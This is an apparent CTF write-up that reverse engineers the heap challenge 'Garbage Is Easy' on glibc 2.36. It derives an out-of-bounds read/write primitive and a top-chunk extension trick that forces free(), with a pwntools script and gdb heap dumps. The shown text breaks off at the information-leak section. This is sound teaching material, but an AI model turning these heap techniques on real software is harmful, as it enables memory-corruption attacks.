# FE-CTF 2022: Cyber Demon
# Challenge: Garbage Is Easy
## Tags
`pwn`, `remote`

**prerequisite:** Knowledge of C, comfortable with a debugger, basic binary exploitation experience.



- [Challenge: Garbage Is Easy](#challenge-garbage-is-easy)
    + [Initial information gathering](#initial-information-gathering)
    + [Reverse engineering](#reverse-engineering)
      - [Add new garbage bag](#add-new-garbage-bag)
          + [Dynamic](#dynamic)
          + [Static](#static)
          + [Summary](#summary)
      - [Admire garbage](#admire-garbage)
          + [Dynamic](#dynamic-1)
          + [Static](#static-1)
          + [Summary](#summary-1)
      - [Fill garbage bag](#fill-garbage-bag)
          + [Dynamic](#dynamic-2)
          + [Static](#static-2)
          + [Summary](#summary-2)
      - [Summary for reverse engineering](#summary-for-reverse-engineering)
    + [Heap crash course](#heap-crash-course)
    + [Inspecting the heap of the challenge](#inspecting-the-heap-of-the-challenge)
    + [Finding primitives](#finding-primitives)
      - [Read/Write out of bounds](#readwrite-out-of-bounds)
          + [Read out of bounds](#read-out-of-bounds)
          + [Write out of bounds](#write-out-of-bounds)
      - [Top chunk extension (cause a `free()` call)](#top-chunk-extension-cause-a-free-call)
      - [Sumary](#sumary)
    + [Getting information leaks](#getting-information-leaks)
      - [Summary](#summary-3)
    + [Crafting exploits](#crafting-exploits)
      - [Opening pandora's box (juggling unsorted bin to become t-cache via a variant of the `house of lore`-technique)](#opening-pandoras-box-juggling-unsorted-bin-to-become-t-cache-via-a-variant-of-the-house-of-lore-technique)
      - [Making it last (From one-time t-cache hijack to consistent arbitrary r/w)](#making-it-last-from-one-time-t-cache-hijack-to-consistent-arbitrary-rw)
        * [safe-linking mitigation (PROTECT_PTR)](#safe-linking-mitigation-protect_ptr)
        * [Making it last (Hijacking `malloc index` (`&garbage_truck`))](#making-it-last-hijacking-malloc-index-garbage_truck)
          + [Even more leaks plz (getting PIE leak)](#even-more-leaks-plz-getting-pie-leak)
          + [Unlimited power (Actually taking control over the `malloc indexer` (`&garbage_truck`))](#unlimited-power-actually-taking-control-over-the-malloc-indexer-garbage_truck)
          + [Last leak, I promise (getting `stack leak`)](#last-leak-i-promise-getting-stack-leak)
    + [Profit (shell)](#profit-shell)
      - [`ROP` our way to heaven (`ROPing` the process and running a `ONE_GADGET`)](#rop-our-way-to-heaven-roping-the-process-and-running-a-one_gadget)
      - [Full exploit script](#full-exploit-script)
          + [Running the exploit script](#running-the-exploit-script)
          + [Flag](#flag)




### Initial information gathering

When extracting the `tar` archive, the player is presented with the following:
```bash
$ tar xvf garbage-is-easy-9ca78eb1027d3a9a44859aa678991a5d045537f6.tar 
garbage-is-easy/chal
garbage-is-easy/glibc/
garbage-is-easy/glibc/libc.so.6
garbage-is-easy/glibc/ld.so
```

The `chal` binary, `ld.so` and `libc.so.6`.



`checksec` reveals that the binary has all modern mitigations:

```bash
$ checksec --file chal 
[*] '/chal/garbage-is-easy/chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
```

*(Notice how `checksec` points out the `RUNPATH`. In the case of the challenge binary, this is simply a quality of life thing, which means the player won't have to manually `LD_PRELOAD` in the correct libc)*

 

And finally running the `libc.so.6` binary reveals that the challenge is using libc version 2.36:

```bash
$ ./ld.so ./libc.so.6 
GNU C Library (GNU libc) stable release version 2.36.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 10.2.1 20210110.
libc ABIs: UNIQUE IFUNC ABSOLUTE
Minimum supported kernel: 3.2.0
For bug reporting instructions, please see:
<https://www.gnu.org/software/libc/bugs.html>.
```



### Reverse engineering

Upon running the `chal` binary, the player is presented with three different options:
```
Mallocs: 0
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 
```



#### Add new garbage bag

###### Dynamic

When selecting option 1, the player is  prompted for a size of what must be assume to be input:

```
Mallocs: 0
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 1
How much are you throwing out:

```

After specifying a size, the user is prompted for "what" that is thrown out:

```
What are you throwing out:

```

And finally after inputting some data, the player is returned to the "main menu", and the `malloc` counter has incremented by one:

```
Mallocs: 1
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 

```



###### Static

Opening the binary in `IDA` presents the user with a large `main()` function, which appears to be the menu selection:
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      printf("Mallocs: %i\n", (unsigned int)dword_50B8);
      menu();
      __isoc99_scanf("%1u", &v3);
      if ( v3 != 3 )
        break;
      fill_garbage();
    }
    if ( v3 > 3 )
      break;
    if ( v3 == 1 )
    {
      add_garbage();
    }
    else
    {
      if ( v3 != 2 )
        break;
      see_garbage();
    }
  }
  puts("Exiting...");
  exit(0);
}
```



The player knows from the dynamic approach, that `v3` must be the `option selection`, so choosing the option where `v3 == 1` would be the menu entry for `Add new garbage bag`.
Inside if the `if` statement , the function `add_garbage()` appears.

Decompiling the function reveals the following:
```c
__int64 add_garbage()
{
  unsigned int v0; // ebx
  _DWORD size[5]; // [rsp+4h] [rbp-1Ch] BYREF

  *(_QWORD *)&size[1] = __readfsqword(0x28u);
  if ( (unsigned int)dword_50B8 > 0xA )
  {
    puts("I think you've made enough garbage. Think of the planet!");
  }
  else
  {
    puts("How much are you throwing out:");
    __isoc99_scanf("%u", size);
    if ( size[0] > 0x1000u )
    {
      puts("That's way too much garbage.");
      exit(0);
    }
    v0 = dword_50B8;
    *((_QWORD *)&garbage_truck + v0) = malloc(size[0]);
    puts("What are you throwing out:");
    read(0, *((void **)&garbage_truck + (unsigned int)dword_50B8), size[0]);
    ++dword_50B8;
  }
  return 0LL;
}
```

First, a check is made. If `dword_50B8` is larger than `0xA`, the program is going to print out a message and simply `return 0`.
`dword_50B8` was also referenced in the `main()` function, where it was used to represent the amount of `malloc`'s  made via the `printf()` statement: `printf("Mallocs: %i\n", (unsigned int)dword_50B8);`.



However if the check is passed, the player will be prompted to specify a `size` via `scanf()`:

```c
puts("How much are you throwing out:");
__isoc99_scanf("%u", size);
```



Then, a condition is presented. The `size` cannot be larger than `0x1000`, or the program will exit:

```c
if ( size[0] > 0x1000u )
{
  puts("That's way too much garbage.");
  exit(0);
}
```


If passed, the function will reach the final segment:

```c
v0 = dword_50B8;
*((_QWORD *)&garbage_truck + v0) = malloc(size[0]);
puts("What are you throwing out:");
read(0, *((void **)&garbage_truck + (unsigned int)dword_50B8), size[0]);
++dword_50B8;
```

At a first glance, this might look confusing.



The first two lines seem to be a way to keep track of `mallocs`:

```c
v0 = dword_50B8;
*((_QWORD *)&garbage_truck + v0) = malloc(size[0]);
```

The player sees the `malloc` counter being stored in the temporary variable `v0`, which is then used to dereference `&garbage_truck` + `malloc counter`. The value of the pointer will then be the return value of a call to `malloc()`, with the `size` specified from earlier.

It is thereby fair to assume that `&garbage_truck` is a form of "index" for all the `mallocd` memory, where `dword_50B8` is an integer keeping track of the amount. `dword_50B8` also works as a form of `index` offset.



The player is now able to write to the newly `mallocd` memory:
```c
puts("What are you throwing out:");
read(0, *((void **)&garbage_truck + (unsigned int)dword_50B8), size[0]);
++dword_50B8;
```

A call to `read()` is made, where the `file descriptor` is `0` (`stdin`), the destination is `&garbage_truck` + `malloc counter` and the `amount` is the `size` variable set at the start of the function.

Finally, the `malloc counter` is incremented by one: `++dword_50B8;`.


The function now returns to main (`return 0LL;`).



###### Summary

- A `malloc counter` is present, which `IDA` has named `dword_50B8`
- A `malloc index` is present, which gets indexed via `malloc counter`
- `malloc counter` cannot exceed `0xA` in size
- `malloc()` calls can at most be `0x1000` in size
- A call to `read()` is made to the newly `allocated memory`



#### Admire garbage

###### Dynamic

When selecting option 2, the player is  prompted for an index, in what might be assumed to be a `read()` function:

```
Mallocs: 0
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 2
Which garbage bag do you want to look at:

```

After specifying a supposed index, the challenge responds with the following:

```
Which garbage bag do you want to look at:
0
*You stare in to the distance, thinking to yourself: "Man.. I wish I had more trash"*
Mallocs: 0
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 

```

And the player is returned to the menu.

Adding some garbage via `Add new garbage bag`, the player might try again:

```
Mallocs: 0
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 1
How much are you throwing out:
10
What are you throwing out:
ABCDEFGH
Mallocs: 1
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 2
Which garbage bag do you want to look at:
0
ABCDEFGH

Mallocs: 1
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 
```



The player will notice that they are able to `read()` data they made via `Add new garbage bag`.



###### Static

With the knowledge accumulated  from analyzing `Add new garbage bag`, the player will quickly jump to the `see_garbage()` function (as it is where `v3 == 2`):

```c
__int64 see_garbage()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Which garbage bag do you want to look at:");
  __isoc99_scanf("%u", &v1);
  if ( dword_50B8 && dword_50B8 - 1 >= v1 )
    puts(*((const char **)&garbage_truck + v1));
  else
    puts("*You stare in to the distance, thinking to yourself: \"Man.. I wish I had more trash\"*");
  return 0LL;
}
```

First, the player is prompted to give an unsigned integer to the variable `v1` via the `scanf()` call: ` __isoc99_scanf("%u", &v1)`.



The player will then notice that the `malloc counter` (`dword_50B8`) is present, and that a constraint is also present containing the `malloc counter`:

```c
if ( dword_50B8 && dword_50B8 - 1 >= v1 )
    puts(*((const char **)&garbage_truck + v1));
  else
    puts("*You stare in to the distance, thinking to yourself: \"Man.. I wish I had more trash\"*");
```

First, the `if` statements verifies that the `malloc counter` is above `0`. Secondly, it verifies that the `v0` variable is not larger than `malloc counter`-1.
*Notice that the `malloc counter` has a subtraction of `1`. This is due to the fact that the `malloc index` is `0 indexed`.*

If the constraint is met, a call to `puts()` is made to the value of `&garbage_truck` + `v0` (which is the `malloc index`).  This means the player can call `puts()` on their allocated memory. If the constraints fail (in case `malloc counter` is `0` or that the requested entry is larger than the `malloc counter`), a message is printed instead of printing the `mallocd space`.

Finally, the function returns to `main()`: `return 0LL;`



###### Summary

- Player can read any of the `malloc index` entries, provided it exists and that it is not above the amount allocated.





#### Fill garbage bag

###### Dynamic

When selecting option 3, the player is  prompted for an index, in what might be assumed to be an  `edit` function:

```
Mallocs: 0
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 3
Which garbage bag do you want to add to:

```

After specifying a supposed index, the challenge responds with the following:

```
Which garbage bag do you want to add to:
0
You accidentally plant a tree instead of throwing out garbage. Unfortunate.
Mallocs: 0
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 

```

And the player is returned to the menu.

Adding some garbage via `Add new garbage bag`, the player might try again:

```
Mallocs: 0
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 1
How much are you throwing out:
10
What are you throwing out:
ABCDEFGH  
Mallocs: 1
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 3
Which garbage bag do you want to add to:
0
What are you throwing out:
IJKLMNOP
Mallocs: 1
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
>
```



When inspecting `malloc index` `0` via the `Admire garbage` function, the player will notice that the `malloc data` has been modified:

```
Mallocs: 1
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 2
Which garbage bag do you want to look at:
0
IJKLMNOP


```

The player can thereby assume that they are able to edit their `malloc index` entries.



###### Static

With the knowledge accumulated  from analyzing `Add new garbage bag`, the player will quickly jump to the `fill_garbage()` function (as it's where `v3 == 3`):

```c
__int64 fill_garbage()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Which garbage bag do you want to add to:");
  __isoc99_scanf("%u", &v1);
  if ( dword_50B8 && dword_50B8 - 1 >= v1 )
    write_buf(v1);
  else
    puts("You accidentally plant a tree instead of throwing out garbage. Unfortunate.");
  return 0LL;
}
```

As to be expected by now, the player is prompted with a `scanf()` call to `v1`, which effectively works as the `malloc index` selection. 

And once again as with `Admire garbage`, a sanity check is made on the selection to make sure that it is within bounds of `malloc index` (`  if ( dword_50B8 && dword_50B8 - 1 >= v1 )`).

And yet again, if the condition fails, a message will be printed and the player will be returned to the main menu.

However what's different here, is that a new function is introduced within the `fill_garbage()` function, namely `write_buf(v1);`. The `write_buf(v1);` call is only made if the `malloc index` sanity check is passed. The player will notice that `write_buf` takes the argument `v1`, which is the `malloc index` selection value.

Decompiling the function reveals the following:

```c
ssize_t __fastcall write_buf(int a1)
{
  int v2; // [rsp+14h] [rbp-Ch]

  v2 = strlen(*((const char **)&garbage_truck + a1));
  if ( (v2 & 7) != 0 )
    v2 += 8 - v2 % 8;
  puts("What are you throwing out:");
  return read(0, *((void **)&garbage_truck + a1), v2);
}
```



First, `strlen()` is called on `&garbage_truck` + `offset`, which is the `malloc index` and the argument input (`v1`). The outcome of the `strlen()` function is stored in `v2`.

```c
v2 = strlen(*((const char **)&garbage_truck + a1));
```



Next, a rather odd check is made.

```c
  if ( (v2 & 7) != 0 )
    v2 += 8 - v2 % 8;
```

Essentially what is happening here, is that `v2` (the result of `strlen()`) gets checked if it's `8-byte aligned`. 

if it is, the process continues as normal. If not, `v2` will be incremented up until the nearest 8-byte alignment (`v2 += 8 - v2 % 8`).



Finally, a call to `read()` is made. This is similar to the one in `Add new garbage bag`, as it takes `stdin` as input, with the `destination address` being a `malloc index` of the players choosing. Finally, the amount is gathered from the `strlen()` call, and padded to become `8-byte aligned`.

```c
return read(0, *((void **)&garbage_truck + a1), v2);
```



The function then returns to main.



###### Summary

- Player can edit any `malloc index` value, as long as it exsists
- The `amount` of data that can be `read()` (written to the address) is deduced via `strlen()`, and padded to the nearest `8-byte alignment`



#### Summary for reverse engineering

- The `binary` contains a menu, with three options that can be summarized as the following:
  1. `Malloc` data (`read(stdin, malloc(size), size)`)
  2. Read malloc (`puts(malloc_index[choice])`)
  3. Edit malloc (`read(stdin, malloc_index[choice], strlen(malloc_index[choice])+alignment)`)
- 
  The player can at most call `malloc()` `0xA` (11) times.

- The binary contains no obvious `out-of-bounds ` read or write issues, and has no `free()` calls.

- The binary calls `puts()` on controlled memory.

- The binary `8-byte aligns` the return value from `strlen()` calls.

- The binary uses `glibc 2.36` and contains all of the latests `mitigations` (`Full RELRO`, `STACK CANARY`, `None-executable stack` and `Position Independent Executables`).




### Heap crash course

I would highly recommend you read sourceware's [MallocInternals](https://sourceware.org/glibc/wiki/MallocInternals) before continuing, as it provides a great quick overview of what "`Chunks`", "`Arenas`", "`prev_size`" and so on is.  However you mainly have to focus on understanding `chunks`, `heap ` and `bins` to follow along with the writeup.

Furthermore you should be comfortable with a debugger, and a form of heap visualizer. During this writeup I will be using `gdb` and the plugin [pwndbg](https://github.com/pwndbg/pwndbg).

Once you have installed `pwndbg` and read the `MallocInternals`, you should be well suited to following along.





### Inspecting the heap of the challenge

Welcome back. By now you must be a ninja in heap. If you aren't, fear not. It all makes a lot more sense once you get your hands on the binary and start looking at it in `gdb`.



Start the binary and make a new call to `malloc()`:

```
$ gdb ./chal 
GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
[...]
Reading symbols from ./chal...
(No debugging symbols found in ./chal)
------- tip of the day (disable with set show-tips off) -------
Use GDB's dprintf command to print all calls to given function. E.g. dprintf malloc, "malloc(%p)\n", (void*)$rdi will print all malloc calls
pwndbg> r
Starting program: /chal/garbage-is-easy/chal 
[...]

Mallocs: 0
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 1
How much are you throwing out:
10
What are you throwing out:
AAAAAAA  
Mallocs: 1
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> ^C
```



Inspect the `heap` via the `heap` and `vis` command:

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555a000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x55555555a290
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x55555555a2b0
Size: 0x20d51
```

```
pwndbg> vis

0x55555555a000	0x0000000000000000	0x0000000000000291	................
[...]
0x55555555a290	0x0000000000000000	0x0000000000000021	........!.......
0x55555555a2a0	0x0a41414141414141	0x0000000000000000	AAAAAAA.........
0x55555555a2b0	0x0000000000000000	0x0000000000020d51	........Q.......	 <-- Top chunk
```



Here, the player sees that two `chunks` have been allocated, one with size: `0x291` and the other with size `0x21`.

The heap sized `0x21` contains the `A`s that was specified via the `Add new garbage bag` function. Referring to the [sourceware](https://sourceware.org/glibc/wiki/MallocInternals) link, the player can see that it follows the specification. `0x21` is the `size` field, with the `prev-in-use` flag set to `1`. Even though the player only allocated `10` bytes via `malloc()`, it still returned `0x20` bytes. This is due to the `meta-data` that's needed to be stored inside the `chunk` once `free'd` . 

The smallest `chunk` available is `4*sizeof(void*)` (or `0x18` bytes of actual write-able data). It is important to remember that `malloc()` will always make sure the requested space is `8-byte aligned`. 



Next to the newly created `chunk` is the `Top chunk`. This is what keeps track of how much free space is left in the `heap`.



Using `telescope` on the `malloc index` (`&garbage_truck`), the player can get a quick understanding of the `malloc index` setup:

```
pwndbg> telescope &garbage_truck 12
00:0000│  0x555555559060 (garbage_truck) —▸ 0x55555555a2a0 ◂— 'AAAAAAA\n'
01:0008│  0x555555559068 (garbage_truck+8) ◂— 0x0
... ↓     9 skipped
0b:0058│  0x5555555590b8 (garbage_truck+88) ◂— 0x1
```

`&garbage_truck[0]` contains the address of the `chunk` that was just allocated via `malloc`.
`&garbage_truck[11]` contains the `malloc counter` (`dword_50B8`).



Finally, the `0x291` segment is used by `malloc` for `heap management` and will be useful later.





### Finding primitives

#### Read/Write out of bounds

Keeping both the `Fill garbage bag` function, the `chunk layout` in and the `8-byte alignment` in mind, an `out-of-bounds read/write` primitive can be achieved. 



Creating two new `malloc()` entries, and filling them with `24` (`0x18`) `A`s and 24 `B`s gives the following `chunk` structure:

```
Mallocs: 0
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 1
How much are you throwing out:
24
What are you throwing out:
AAAAAAAAAAAAAAAAAAAAAAAAMallocs: 1
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 1
How much are you throwing out:
24
What are you throwing out:
BBBBBBBBBBBBBBBBBBBBBBBBMallocs: 2
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> ^C
[...]
pwndbg> vis

0x55555555a000	0x0000000000000000	0x0000000000000291	................
[...]
0x55555555a290	0x0000000000000000	0x0000000000000021	........!.......
0x55555555a2a0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x55555555a2b0	0x4141414141414141	0x0000000000000021	AAAAAAAA!.......
0x55555555a2c0	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x55555555a2d0	0x4242424242424242	0x0000000000020d31	BBBBBBBB1.......	 <-- Top chunk
```

*(NOTE: Press ctrl-d to send the data without sending a `\x0A` (newline) with it)*



###### Read out of bounds

From static analysis, the player knows that `Admire garbage` calls `puts()` on the `chunk`, which would look like the following:

```
Mallocs: 2
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 2
Which garbage bag do you want to look at:
0
AAAAAAAAAAAAAAAAAAAAAAAA!
```

Notice the `!`. That's the `chunk` size field of `malloc index[1]` that is read from `puts()`, as it will simply read up until the first `null-byte`. Coupled with the `write out of bounds` primitive, this becomes very powerful.



###### Write out of bounds

From reverse engineering, the player also knows that `Fill garbage bag` calls `strlen()` and adds `8-byte alignment` (presumably because `malloc()` `8-byte aligns` data so the users don't waste space).
But since the `chunk` is aligned right up next to the `size` field of the next `chunk`, `strlen()` will include it when measuring the length of the `chunk` data, and because of the `8-byte alignment`, that means the player can write `32` bytes instead of `24` bytes to `malloc index[0]`, which allows the player to overflow in to the following chunk.

This can be seen by editing entry `0` in the `malloc index`:

```
pwndbg> c
Continuing.
Mallocs: 2
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 3
Which garbage bag do you want to add to:
0
What are you throwing out:
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCMallocs: 2
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> ^C
[...]
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555a000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x55555555a290
Size: 0x21

Allocated chunk | PREV_INUSE | IS_MMAPED
Addr: 0x55555555a2b0
Size: 0x4343434343434343
```

*NOTE: `vis` is now in a broken state, as the `size` field of `malloc index[1]` has been overwritten by `0x4343434343434343`, which causes `vis` to attempt to print `0x4343434343434343` bytes. Use the `heap`, `dq` and `telescope` to debug if playing around with size fields.* 

The next `chunk size header` has now been overwritten, and when calling the function `Admire garbage` on `malloc index[0]`, the player sees the following:
```
Mallocs: 2
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 2
Which garbage bag do you want to look at:
0
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCBBBBBBBBBBBBBBBBBBBBBBBB1
Mallocs: 2
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 
```

If the player were to call `Fill garbage bag` again on `malloc index[0]`, `strlen()` would now read up until and past the `top chunk` field.
This primitive can thereby be chained together to achieve very long `out of bounds read/write`, as long as the first byte of an `8-byte aligned` segment is not a `null-byte`.



#### Top chunk extension (cause a `free()` call)

Having calls to `malloc()` and a way to overwrite the `top chunk` field is all that is needed to cause a call to `free()` (and by extension open up for `heap exploitation`).



In `glibc`, if the `top chunk` size header is not large enough to satisfy a `malloc()` request, the `brk()` `syscall` will be initiated. 

```
$ man -s2 brk
[...]
DESCRIPTION
       brk()  and  sbrk() change the location of the program break, which defines the end of the process's data segment (i.e., the program break is the first location after the end of the uninitialized data segment).  Increasing the program break has the effect of allocating memory to the process; decreasing the break deallocates memory.
```



However what's particularly interesting about this, is that in `glibc`, if the newly appended `data segment` is not aligned with the `top chunk` of the heap, `glibc` will assume something is up, and attempt to `free()` the remaining heap which is in-between the old and the new `data segment`. See [glibc source](https://elixir.bootlin.com/glibc/glibc-2.36/source/malloc/malloc.c#L2887).



Assuming the heap-layout is as following:

```
┌────────┬────────┐
│        │   0x21 │ ◄────────  Chunk size
├────────┴────────┤
│00000000 00000000│
│        ┌────────┤           ┌─────────┐
│00000000│  0x301 │ ◄──────── │Top chunk│
├────────┘        │           └────┬────┘
│                 │                │
│                 │                │
│                 │                │
│                 │                │
│                 │                │
│                 │                │
│                 │                │
│                 │                │
│                 │                ▼
│~~~~~~~~~~~~~~~~~│ ◄───────   Allocated Data
                               Segment
```

Here, the untouched `top chunk` points to the end of the `allocated data segment`. However if the `top chunk size` were to get overwritten, the top chunk would point to a different endpoint:

```
┌────────┬────────┐
│        │   0x21 │ ◄────────  Chunk size
├────────┴────────┤
│00000000 00000000│
│        ┌────────┤           ┌─────────┐
│00000000│  0x141 │ ◄──────── │Top chunk│
├────────┘        │           └────┬────┘
│                 │                │
│                 │                │
│                 │                │
│                 │                │
│&&&&&&&&&&&&&&&&&│ ◄──────────────┘
│                 │
│                 │
│                 │
│                 │
│~~~~~~~~~~~~~~~~~│ ◄───────   Allocated Data
                               Segment
```

The `top chunk` now points to a different address than the `Data Segment`.
Now initializing a `malloc()` larger than the `top chunk size` (`0x141`) will cause the `brk()` syscall to be initiated.

The kernel will extend the process `data segment`, which will be extended from the old `allocated data segment` end. `glibc` however checks if the newly `allocated data segment` continues from the end of `top chunk`:

```
                  ┌────────┬────────┐
                  │        │   0x21 │ ◄────────  Chunk size
                  ├────────┴────────┤
                  │00000000 00000000│
                  │        ┌────────┤           ┌─────────┐
                  │00000000│  0x141 │ ◄──────── │Top chunk│
                  ├────────┘        │           └────┬────┘
                  │                 │                │
                  │                 │                │
                  │                 │                │
┌──────────┐      │                 │                │
│ Expected │      │&&&&&&&&&&&&&&&&&│ ◄──────────────┘
│ Segment  ├────► │                 │
└──────────┘      │                 │
                  │                 │
┌──────────┐      │                 │
│Actual new│      │~~~~~~~~~~~~~~~~~│ ◄───────── Old Data
│segment   ├─────►│-----------------│            Segment end
└──────────┘      │                 │
                  │                 │
                  │                 │
                  │                 │
                  │                 │
                  │                 │
                  │                 │
                  │                 │
                  │                 │
                  │~~~~~~~~~~~~~~~~~│ ◄─────── New Allocated Data
                                               Segment end
```

And as to save space, `glibc` decides to `free()` the remaining space in the `top chunk`, as it is not contiguous with the `top chunk` and since the new `top chunk` will be placed in the newly `Allocated Data Segment`, there is no reason to keep it `allocated`. The result is that `free()` gets called on the previous top chunk:

```
                  ┌────────┬────────┐
                  │        │   0x21 │ ◄────────  Chunk size
                  ├────────┴────────┤
                  │00000000 00000000│
                  │        ┌────────┤
                  │00000000│XXXXXXXX│
                  ├────────┘XXXXXXXX│
                  │XXXXXXXXXXXXXXXXX│
                  │XXXXXXXXXXXXXXXXX│           ┌────────────┐
                  │XXXXXXXXXXXXXXXXX│ ◄─────────┤Unsorted bin│
                  │XXXXXXXXXXXXXXXXX│           │entry       │
                  │XXXXXXXXXXXXXXXXX│           └────────────┘
                  │xxxxxxxxxxxxxxxxx│
                  │xxxxxxxxxxxxxxxxx│
                  │                 │
┌──────────┐      │                 │
│Actual new│      │~~~~~~~~~~~~~~~~~│ ◄───────── Old Data
│segment   ├─────►├────────┬────────┤            Segment end
└──────────┘      │        │  0x140 │
                  ├────────┴────────┤
                  │00000000 00000000│
                  │                 │
                  │00000000 00000000│
                  │        ┌────────┤
                  │00000000│  0x561 │ ◄────────  New top chunk
                  ├────────┘        │
                  │                 │
                  │~~~~~~~~~~~~~~~~~│ ◄─────── New Allocated Data
                                               Segment end
```

There are a few mitigations for when and how this is allowed. The technique was originally describe by [angelboy](http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html) in the `house of orange` heap exploit technique. Shellphish made an [excellent writeup](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_orange.c) on it, if you want to read up on the specifics of `top chunk extension` and `vtable hijacking for filestreams`.

One thing to keep in mind, is that the `top chunk size` has to be `page-aligned` to pass the `mitigations`.



The `top chunk extension` method can be recreated on the challenge binary like the following:

```python
from pwn import *

elf = ELF("chal")
libc = elf.libc
p = process(elf.path)
gdb.attach(p)

def menu():
    return p.recvuntil(b'> ')

def malloc(size, data):
    p.sendline(b'1')
    p.sendlineafter(b'out:\n', str(size).encode())
    p.sendafter(b'out:\n', data)
    menu()

def see(index):
    p.sendline(b'2')
    p.sendlineafter(b"at:\n", str(index).encode())
    res = p.recvuntil(b"1)").split(b"\nMallocs")[0]
    menu()
    return res

def edit(index, data):
    p.sendline(b'3')
    p.sendlineafter(b"to:", str(index).encode())
    p.sendafter(b"out:", data)
    menu()




# Cause a free due to top chunk extension

size = 0x400 - 0x290 - 8                # Calculate the size needed to align top chunk
info("Mallocing %s bytes" % hex(size))
malloc(size, b'A'*size)                 # malloc() and fill with data to allow for strlen out of bounds write

info("Overwriting top chunk size with 0xc01")
edit(0, b'B'*size+p16(0xc01)+p8(0))     # Overwrite top chunk size

malloc(0x1000, b'GiveMeAFree')          # malloc() large data to trigger BRK()
                                        # And cause a free on previous

p.interactive()
```



If paused right before the `large malloc` (`0x1000`), the player can observe that the `top chunk size` has been resized to `0xc01`.

```
pwndbg> vis

0x5700632e1000	0x0000000000000000	0x0000000000000291	................
[...]
0x5700632e1290	0x0000000000000000	0x0000000000000171	........q.......
0x5700632e12a0	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
[...]
0x5700632e1400	0x4242424242424242	0x0000000000000c01	BBBBBBBB........	 <-- Top chunk
```



After the large `malloc()`, `vis` looks like the following:

```
pwndbg> vis

0x5f9de9352000	0x0000000000000000	0x0000000000000291	................
[...]
0x5f9de9352290	0x0000000000000000	0x0000000000000171	........q.......
[...]
0x5f9de9352400	0x4242424242424242	0x0000000000000be1	BBBBBBBB........	 <-- unsortedbin[all][0]
0x5f9de9352410	0x0000722e5f72bcc0	0x0000722e5f72bcc0	..r_.r....r_.r..
0x5f9de9352420	0x0000000000000000	0x0000000000000000	................
[...]
0x5f9de9352fe0	0x0000000000000be0	0x0000000000000010	................
0x5f9de9352ff0	0x0000000000000000	0x0000000000000011	................
```



And perhaps more importantly, `bins` now has an entry:

```
pwndbg> bins
tcachebins
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x5f9de9352400 —▸ 0x722e5f72bcc0 (main_arena+96) ◂— 0x5f9de9352400
smallbins
empty
largebins
empty
```



#### Sumary

- `Write out of bounds` can be achieved due to `strlen()` including `meta-data` from `chunks` aligned next to the data in the controlled chunk. 
  - `8-byte alignment` allows for "infinite" write, as long as the `8-byte` aligned segment does not start on a `null-byte`.
- `Read out of bounds` can be achieved in combination with the `write out of bounds` primitive, as `puts()` prints until it reaches a `null-byte`.
- A call to `free` can be triggered by overwriting the `top chunk size` and requesting a large amount of memory. Because it's none-contiguous, the old `top-chunk` is freed.



### Getting information leaks

Referring to [sourceware's MallocInternals](https://sourceware.org/glibc/wiki/MallocInternals), some things stand out. 

When looking at the diagram for `free'd` `chunks`, one might notice the pointers inside of the `chunk`:

![free chunk](https://i.imgur.com/0SLLUDJ.png)



